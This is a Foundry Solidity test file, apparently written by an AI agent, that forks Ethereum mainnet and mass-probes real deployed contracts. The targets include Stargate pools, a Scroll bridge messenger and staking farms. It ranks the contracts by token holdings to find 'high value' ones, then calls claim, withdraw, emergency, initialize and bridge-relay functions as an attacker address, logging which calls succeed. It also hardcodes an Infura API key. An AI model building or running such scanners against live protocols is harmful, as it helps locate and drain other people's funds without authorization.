// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Unmapped Contract Analysis
 * @notice Deep analysis of unmapped contracts from contracts.txt
 * Following CLAUDE.md methodology: capability + broken assumption + preconditions
 */
contract UnmappedContractAnalysis is Test {
    // Common tokens for balance checks
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    // =====================================================
    // BATCH 1: Contracts from lines 1-100 not yet analyzed
    // =====================================================

    function test_analyze_0x36f513fe() public {
        // Line 1 - Unknown contract
        address target = 0x36f513fe52123addb4d004348a0801dc443bbb31;
        _analyzeContract(target, "Unknown_0x36f5");
    }

    function test_analyze_0x763b8a88() public {
        // Line 2 - Unknown contract
        address target = 0x763b8a88ac40edb6cc5c13faac1fcff4b393218d;
        _analyzeContract(target, "Unknown_0x763b");
    }

    function test_analyze_0x38cdb1a8() public {
        // Line 3 - Unknown contract
        address target = 0x38cdb1a8207264c1a07c42c43a4c3ed4bfab7cea;
        _analyzeContract(target, "Unknown_0x38cd");
    }

    function test_analyze_0xc785d059() public {
        // Line 4 - Unknown contract
        address target = 0xc785d05961b3c537cac11f1d496876a255f6d650;
        _analyzeContract(target, "Unknown_0xc785");
    }

    function test_analyze_0xf9d9f4ae() public {
        // Line 5 - Unknown contract
        address target = 0xf9d9f4ae37d09d50a279058c008a4fa98b6336b6;
        _analyzeContract(target, "Unknown_0xf9d9");
    }

    // =====================================================
    // BATCH 2: Contracts from 500-600 range (less analyzed)
    // =====================================================

    function test_analyze_0x3f69bb14() public {
        address target = 0x3f69bb14860f7f3348ac8a5f0d445322143f7fee;
        _analyzeContract(target, "Unknown_0x3f69");
    }

    function test_analyze_0x77b20437() public {
        // Line 517 - StargatePoolNative likely
        address target = 0x77b2043768d28e9c9ab44e1abfc95944bce57931;
        _analyzeContract(target, "Possible_Stargate");
        _testStargateExploit(target);
    }

    function test_analyze_0x9084b5a9() public {
        address target = 0x9084b5a98e3b4b257affd82ae4a1753f87906dce;
        _analyzeContract(target, "Unknown_0x9084");
    }

    // =====================================================
    // BATCH 3: High-value contracts from mid-file
    // =====================================================

    function test_analyze_0x72e2f483() public {
        // Line 706 - StargateEthVault
        address target = 0x72e2f4830b9e45d52f80ac08cb2bec0fef72ed9c;
        _analyzeContract(target, "StargateEthVault");
        _testWETHVaultExploit(target);
    }

    function test_analyze_0x9f0491b3() public {
        // Line 735 - UserWithdrawalManager
        address target = 0x9f0491b32dbce587c50c4c43ab303b06478193a7;
        _analyzeContract(target, "UserWithdrawalManager");
        _testWithdrawalManagerExploit(target);
    }

    // =====================================================
    // BATCH 4: Potential reward/staking contracts
    // =====================================================

    function test_analyze_0x7623e9dc() public {
        // Line 929 - EarlyAdopterPool
        address target = 0x7623e9dc0da6ff821ddb9ebaba794054e078f8c4;
        _analyzeContract(target, "EarlyAdopterPool");
        _testPoolExploit(target);
    }

    function test_analyze_0x5dc58f81() public {
        // Line 907 - GammaFarm
        address target = 0x5dc58f812b2e244daba2fabd33f399cd699d7ddc;
        _analyzeContract(target, "GammaFarm");
        _testFarmExploit(target);
    }

    // =====================================================
    // BATCH 5: Bridge contracts (high value)
    // =====================================================

    function test_analyze_0x6774bcbd() public {
        // Line 139 - L1ScrollMessenger
        address target = 0x6774bcbd5cecef1336b5300fb5186a12ddd8b367;
        _analyzeContract(target, "L1ScrollMessenger");
        _testBridgeExploit(target);
    }

    // =====================================================
    // BATCH 6: Contracts from lines 1500-2000 (least analyzed)
    // =====================================================

    function test_analyze_batch6_samples() public {
        address[] memory targets = new address[](10);
        targets[0] = 0xf374e6f8104379eb3f406b6be394d77cd80f2c88;
        targets[1] = 0xab15b0bddc012092cb23f53953149a7f8c1f9e7f;
        targets[2] = 0x7ad5a683939b89e9bec82a4739b0df7b1fbf829d;
        targets[3] = 0xea31ca828f53a41ba2864fa194bb8a2d3f11c0c0;
        targets[4] = 0x8cc51c532f5a71210d19d87d3d8a1e6f50ad583c;
        targets[5] = 0xe2ba8693ce7474900a045757fe0efca900f6530b;
        targets[6] = 0x581935eb7df30545e5de6c337f5ddc72a9e52b60;
        targets[7] = 0xd32f55975ceb7421129b0222438d9517051c3c8f;
        targets[8] = 0x5e98a25d8d6ff69a8992d6aa57948dfb77d4ecba;
        targets[9] = 0x6efe65c2426b51e9aa0427b96c313e5d8715fd06;

        for (uint i = 0; i < targets.length; i++) {
            console.log("--- Analyzing target", i, "---");
            _quickAnalyze(targets[i]);
        }
    }

    // =====================================================
    // Core Analysis Functions
    // =====================================================

    function _analyzeContract(address target, string memory name) internal {
        console.log("=====================================");
        console.log("Analyzing:", name);
        console.log("Address:", target);
        console.log("=====================================");

        // Check ETH balance
        uint256 ethBal = target.balance;
        console.log("ETH Balance:", ethBal / 1e18, "ETH");

        // Check major token balances
        _checkTokenBalance(target, WETH, "WETH");
        _checkTokenBalance(target, USDC, "USDC");
        _checkTokenBalance(target, USDT, "USDT");
        _checkTokenBalance(target, DAI, "DAI");
        _checkTokenBalance(target, stETH, "stETH");
        _checkTokenBalance(target, LINK, "LINK");
        _checkTokenBalance(target, WBTC, "WBTC");

        // Check if contract is a proxy
        _checkProxyStatus(target);

        // Check common function selectors
        _probeCommonFunctions(target);

        // Try common exploit patterns
        _tryCommonExploits(target);
    }

    function _quickAnalyze(address target) internal {
        if (target.code.length == 0) {
            console.log("Target is EOA, skipping");
            return;
        }

        uint256 ethBal = target.balance;
        if (ethBal > 0.1 ether) {
            console.log("Address:", target);
            console.log("ETH:", ethBal / 1e18);
        }

        uint256 wethBal = _getBalance(target, WETH);
        if (wethBal > 0.1 ether) {
            console.log("WETH:", wethBal / 1e18);
        }

        uint256 usdcBal = _getBalance(target, USDC);
        if (usdcBal > 100e6) {
            console.log("USDC:", usdcBal / 1e6);
        }
    }

    function _checkTokenBalance(address target, address token, string memory name) internal {
        uint256 bal = _getBalance(target, token);
        if (bal > 0) {
            uint8 decimals = _getDecimals(token);
            console.log(name, "Balance:", bal / (10 ** decimals));
        }
    }

    function _getBalance(address target, address token) internal view returns (uint256) {
        (bool s, bytes memory d) = token.staticcall(
            abi.encodeWithSignature("balanceOf(address)", target)
        );
        if (s && d.length >= 32) {
            return abi.decode(d, (uint256));
        }
        return 0;
    }

    function _getDecimals(address token) internal view returns (uint8) {
        (bool s, bytes memory d) = token.staticcall(
            abi.encodeWithSignature("decimals()")
        );
        if (s && d.length >= 32) {
            return abi.decode(d, (uint8));
        }
        return 18;
    }

    function _checkProxyStatus(address target) internal {
        // Check EIP-1967 implementation slot
        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        bytes32 impl = vm.load(target, implSlot);
        if (uint256(impl) != 0) {
            console.log("Proxy Implementation:", address(uint160(uint256(impl))));
        }

        // Check EIP-1967 admin slot
        bytes32 adminSlot = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
        bytes32 admin = vm.load(target, adminSlot);
        if (uint256(admin) != 0) {
            console.log("Proxy Admin:", address(uint160(uint256(admin))));
        }
    }

    function _probeCommonFunctions(address target) internal {
        // Check for owner
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Owner:", owner);
        }

        // Check paused state
        (s, d) = target.staticcall(abi.encodeWithSignature("paused()"));
        if (s && d.length >= 32) {
            bool paused = abi.decode(d, (bool));
            console.log("Paused:", paused ? "YES" : "NO");
        }

        // Check total supply (for vaults/tokens)
        (s, d) = target.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Total Supply:", ts / 1e18);
        }

        // Check total assets (for vaults)
        (s, d) = target.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (s && d.length >= 32) {
            uint256 ta = abi.decode(d, (uint256));
            console.log("Total Assets:", ta / 1e18);
        }

        // Check reward info
        (s, d) = target.staticcall(abi.encodeWithSignature("rewardRate()"));
        if (s && d.length >= 32) {
            uint256 rr = abi.decode(d, (uint256));
            console.log("Reward Rate:", rr);
        }
    }

    function _tryCommonExploits(address target) internal {
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        // Capability 1: Can I claim without depositing?
        (bool s,) = target.call(abi.encodeWithSignature("claim()"));
        if (s) console.log("[!] claim() succeeded!");

        (s,) = target.call(abi.encodeWithSignature("claimReward()"));
        if (s) console.log("[!] claimReward() succeeded!");

        (s,) = target.call(abi.encodeWithSignature("getReward()"));
        if (s) console.log("[!] getReward() succeeded!");

        // Capability 2: Can I withdraw without balance?
        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1));
        if (s) console.log("[!] withdraw(1) succeeded!");

        (s,) = target.call(abi.encodeWithSignature("redeem(uint256)", 1));
        if (s) console.log("[!] redeem(1) succeeded!");

        // Capability 3: Can I trigger emergency functions?
        (s,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
        if (s) console.log("[!] emergencyWithdraw() succeeded!");

        (s,) = target.call(abi.encodeWithSignature("emergencyExit()"));
        if (s) console.log("[!] emergencyExit() succeeded!");

        // Capability 4: Can I call privileged functions?
        (s,) = target.call(abi.encodeWithSignature("pause()"));
        if (s) console.log("[!] pause() succeeded - access control issue!");

        (s,) = target.call(abi.encodeWithSignature("unpause()"));
        if (s) console.log("[!] unpause() succeeded - access control issue!");

        // Capability 5: Can I initialize an uninitialized contract?
        (s,) = target.call(abi.encodeWithSignature("initialize()"));
        if (s) console.log("[!] initialize() succeeded!");

        (s,) = target.call(abi.encodeWithSignature("init()"));
        if (s) console.log("[!] init() succeeded!");

        vm.stopPrank();
    }

    // =====================================================
    // Specific Exploit Tests
    // =====================================================

    function _testStargateExploit(address target) internal {
        console.log("--- Stargate Specific Tests ---");

        // Check endpoint
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("endpoint()"));
        if (s && d.length >= 32) {
            console.log("Endpoint:", abi.decode(d, (address)));
        }

        // Check treasury
        (s, d) = target.staticcall(abi.encodeWithSignature("treasury()"));
        if (s && d.length >= 32) {
            console.log("Treasury:", abi.decode(d, (address)));
        }

        address attacker = address(0xBEEF);
        vm.startPrank(attacker);
        vm.deal(attacker, 10 ether);

        // Try to deposit and immediately withdraw
        (s,) = target.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        console.log("deposit():", s ? "OK" : "FAIL");

        (s,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1.1 ether));
        console.log("withdraw(1.1 ETH):", s ? "EXPLOIT!" : "FAIL");

        vm.stopPrank();
    }

    function _testWETHVaultExploit(address target) internal {
        console.log("--- WETH Vault Specific Tests ---");

        // Check conversion rate
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("convertToShares(uint256)", 1 ether)
        );
        if (s && d.length >= 32) {
            uint256 shares = abi.decode(d, (uint256));
            console.log("1 ETH -> shares:", shares / 1e18);
        }

        (s, d) = target.staticcall(
            abi.encodeWithSignature("convertToAssets(uint256)", 1 ether)
        );
        if (s && d.length >= 32) {
            uint256 assets = abi.decode(d, (uint256));
            console.log("1 share -> assets:", assets / 1e18);
        }

        // First depositor attack check
        (s, d) = target.staticcall(abi.encodeWithSignature("totalSupply()"));
        uint256 totalSupply = 0;
        if (s && d.length >= 32) {
            totalSupply = abi.decode(d, (uint256));
        }

        if (totalSupply < 1000) {
            console.log("[!] Low total supply - first depositor attack possible?");
        }
    }

    function _testWithdrawalManagerExploit(address target) internal {
        console.log("--- Withdrawal Manager Specific Tests ---");

        // Check withdrawal queue
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("nextRequestId()")
        );
        if (s && d.length >= 32) {
            console.log("Next Request ID:", abi.decode(d, (uint256)));
        }

        (s, d) = target.staticcall(
            abi.encodeWithSignature("nextRequestIdToFinalize()")
        );
        if (s && d.length >= 32) {
            console.log("Next to Finalize:", abi.decode(d, (uint256)));
        }

        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        // Try to finalize someone else's request
        (s,) = target.call(abi.encodeWithSignature("claim(uint256)", 1));
        console.log("claim(1):", s ? "CHECK!" : "FAIL");

        // Try to create request with 0
        (s,) = target.call(abi.encodeWithSignature("requestWithdraw(uint256)", 0));
        console.log("requestWithdraw(0):", s ? "CHECK!" : "FAIL");

        vm.stopPrank();
    }

    function _testPoolExploit(address target) internal {
        console.log("--- Pool Specific Tests ---");

        // Check deposit info
        address attacker = address(0xBEEF);
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("depositInfo(address)", attacker)
        );
        if (s) {
            console.log("depositInfo returned data");
        }

        // Check claiming state
        (s, d) = target.staticcall(abi.encodeWithSignature("claimingOpen()"));
        if (s && d.length >= 32) {
            console.log("Claiming Open:", abi.decode(d, (uint256)));
        }

        vm.startPrank(attacker);
        vm.deal(attacker, 10 ether);

        // Try deposit
        (s,) = target.call{value: 1 ether}(abi.encodeWithSignature("deposit()"));
        console.log("deposit():", s ? "OK" : "FAIL");

        // Try withdraw
        (s,) = target.call(abi.encodeWithSignature("withdraw()"));
        console.log("withdraw():", s ? "CHECK!" : "FAIL");

        vm.stopPrank();
    }

    function _testFarmExploit(address target) internal {
        console.log("--- Farm Specific Tests ---");

        // Check profit factor
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("profitFactor()")
        );
        if (s && d.length >= 32) {
            uint256 pf = abi.decode(d, (uint256));
            console.log("Profit Factor:", pf);
        }

        // Check cumS (cumulative share)
        (s, d) = target.staticcall(abi.encodeWithSignature("cumS()"));
        if (s && d.length >= 32) {
            uint256 cumS = abi.decode(d, (uint256));
            console.log("cumS:", cumS);
        }

        // Check epoch
        (s, d) = target.staticcall(abi.encodeWithSignature("epoch()"));
        if (s && d.length >= 32) {
            console.log("Epoch:", abi.decode(d, (uint256)));
        }

        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        // Try harvest
        (s,) = target.call(abi.encodeWithSignature("harvest()"));
        console.log("harvest():", s ? "CHECK!" : "FAIL");

        // Try claim rewards
        (s,) = target.call(abi.encodeWithSignature("claimReward(address)", attacker));
        console.log("claimReward():", s ? "CHECK!" : "FAIL");

        vm.stopPrank();
    }

    function _testBridgeExploit(address target) internal {
        console.log("--- Bridge Specific Tests ---");

        // Check message queue
        (bool s, bytes memory d) = target.staticcall(
            abi.encodeWithSignature("messageQueue()")
        );
        if (s && d.length >= 32) {
            console.log("Message Queue:", abi.decode(d, (address)));
        }

        // Check rollup
        (s, d) = target.staticcall(abi.encodeWithSignature("rollup()"));
        if (s && d.length >= 32) {
            console.log("Rollup:", abi.decode(d, (address)));
        }

        address attacker = address(0xBEEF);
        vm.startPrank(attacker);

        // Try to relay message
        (s,) = target.call(
            abi.encodeWithSignature(
                "relayMessageWithProof(address,address,uint256,uint256,bytes,bytes32,bytes)",
                attacker, attacker, 1 ether, 0, "", bytes32(0), ""
            )
        );
        console.log("relayMessageWithProof:", s ? "CHECK!" : "FAIL");

        // Try to drop message
        (s,) = target.call(
            abi.encodeWithSignature(
                "dropMessage(address,address,uint256,uint256,bytes)",
                attacker, attacker, 1 ether, 0, ""
            )
        );
        console.log("dropMessage:", s ? "CHECK!" : "FAIL");

        vm.stopPrank();
    }

    // =====================================================
    // High-Value Balance Scanner
    // =====================================================

    function test_scanHighValueContracts() public {
        console.log("=== HIGH VALUE CONTRACT SCANNER ===");

        // Sample of potentially high-value addresses from contracts.txt
        address[] memory candidates = new address[](30);
        candidates[0] = 0x36f513fe52123addb4d004348a0801dc443bbb31;
        candidates[1] = 0x763b8a88ac40edb6cc5c13faac1fcff4b393218d;
        candidates[2] = 0x38cdb1a8207264c1a07c42c43a4c3ed4bfab7cea;
        candidates[3] = 0xc785d05961b3c537cac11f1d496876a255f6d650;
        candidates[4] = 0xf9d9f4ae37d09d50a279058c008a4fa98b6336b6;
        candidates[5] = 0x0650caf159c5a49f711e8169d4336ecb9b950275;
        candidates[6] = 0x78524beeac12368e600457478738c233f436e9f6;
        candidates[7] = 0xe3cbe3a636ab6a754e9e41b12b09d09ce9e53db3;
        candidates[8] = 0x34c0bd5877a5ee7099d0f5688d65f4bb9158bde2;
        candidates[9] = 0xecf61d6faa3b9fae7195af3bc9891450c1733f78;
        candidates[10] = 0xde89a6df6951c7b33814b02c2c3d567ce4137174;
        candidates[11] = 0x96a84f061d51d27725ca17491ff36bf0283ce415;
        candidates[12] = 0xfe08d40eee53d64936d3128838867c867602665c;
        candidates[13] = 0xf6080d9fbeebcd44d89affbfd42f098cbff92816;
        candidates[14] = 0xfaae2946e846133af314d1df13684c89fa7d83dd;
        candidates[15] = 0xc8cf6d7991f15525488b2a83df53468d682ba4b0;
        candidates[16] = 0xb82c71c2cff8ab8aa72422aa22855cb064a8dbfd;
        candidates[17] = 0x312e67b47a2a29ae200184949093d92369f80b53;
        candidates[18] = 0x125b367c16c5858f11e12948404f7a1371a0fda3;
        candidates[19] = 0xc94c4ec62a59fcf4964873cc6529559cc7717388;
        candidates[20] = 0xa1e2481a9cd0cb0447eeb1cbc26f1b3fff3bec20;
        candidates[21] = 0x4fef9d741011476750a243ac70b9789a63dd47df;
        candidates[22] = 0xa86b9b9c58d4f786f8ea89356c9c9dde9432ab10;
        candidates[23] = 0x4f48031b0ef8accea3052af00a3279fba31b50d8;
        candidates[24] = 0xfc6e18e22ad11592494b3d541ba25af63a807527;
        candidates[25] = 0x2677c4c8757da1857cc7cc4071e0e0dd32ccb975;
        candidates[26] = 0xa90eac89196f5acb22c30d44d93148377fc6670e;
        candidates[27] = 0x36aff7001294dae4c2ed4fdefc478a00de77f090;
        candidates[28] = 0x99cd4ec3f88a45940936f469e4bb72a2a701eeb9;
        candidates[29] = 0x298afb19a105d59e74658c4c334ff360bade6dd2;

        uint256 highValueThreshold = 10 ether;

        for (uint i = 0; i < candidates.length; i++) {
            address c = candidates[i];
            if (c.code.length == 0) continue;

            uint256 totalValue = c.balance;
            totalValue += _getBalance(c, WETH);
            totalValue += _getBalance(c, stETH);

            // Rough USD conversion for stables (1 USDC = ~0.0003 ETH)
            totalValue += (_getBalance(c, USDC) * 3) / 10000;
            totalValue += (_getBalance(c, USDT) * 3) / 10000;
            totalValue += (_getBalance(c, DAI) / 3000);

            if (totalValue > highValueThreshold) {
                console.log("=== HIGH VALUE FOUND ===");
                console.log("Address:", c);
                console.log("Estimated ETH Value:", totalValue / 1e18);
                _analyzeContract(c, "HighValue");
            }
        }
    }
}
